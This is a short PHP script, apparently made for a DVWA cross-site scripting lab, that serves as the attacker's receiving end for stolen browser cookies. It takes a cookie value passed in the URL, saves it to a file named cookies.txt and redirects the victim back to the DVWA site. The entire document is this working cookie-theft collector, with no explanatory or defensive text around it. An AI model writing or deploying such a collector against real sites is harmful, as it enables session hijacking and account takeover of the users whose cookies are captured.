<?php

if(isset($_GET['cookie'])){

    $cookie = $_GET['cookie'];
    $file = fopen('cookies.txt',"w");
    fwrite($file, $cookie);
    fclose($file);
header("Location: localhost/DVWA");

}
?>
